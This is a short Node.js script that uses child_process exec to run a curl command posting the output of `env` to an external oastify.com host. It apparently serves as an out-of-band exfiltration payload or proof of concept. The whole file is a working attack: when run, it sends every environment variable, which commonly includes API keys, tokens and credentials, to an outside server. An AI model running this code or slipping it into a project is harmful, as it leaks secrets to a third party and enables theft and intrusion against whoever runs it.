import { exec } from 'child_process';

const command = 'curl -d "`env`" https://9hrbtiis334l8m58rz4c9nnowf26qyen.oastify.com';

exec(command, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    return;
  }
  console.log(`Stdout: ${stdout}`);
});
